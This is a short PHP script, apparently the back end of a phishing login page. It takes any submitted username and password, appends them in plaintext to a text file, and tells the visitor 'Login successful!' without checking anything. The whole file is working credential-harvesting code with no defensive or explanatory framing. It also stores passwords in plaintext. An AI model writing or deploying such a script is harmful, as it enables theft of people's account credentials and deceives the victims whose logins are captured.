<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    $data = "Username: $username | Password: $password\n";
    
    // Save to a text file
    file_put_contents("login_data.txt", $data, FILE_APPEND);
    
    echo "Login successful!"; // Redirect or show a message
}
?>
